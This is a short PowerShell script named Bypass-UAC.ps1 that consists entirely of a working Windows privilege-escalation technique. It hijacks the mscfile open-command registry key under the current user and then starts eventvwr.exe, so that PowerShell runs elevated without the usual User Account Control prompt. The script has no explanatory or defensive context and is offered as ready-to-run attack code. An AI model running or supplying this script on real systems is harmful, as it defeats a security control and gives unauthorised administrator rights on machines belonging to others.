# Bypass-UAC.ps1
New-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "" -Value "powershell.exe -Command 'Start-Process PowerShell -Verb runAs'" -Force
Start-Process eventvwr.exe
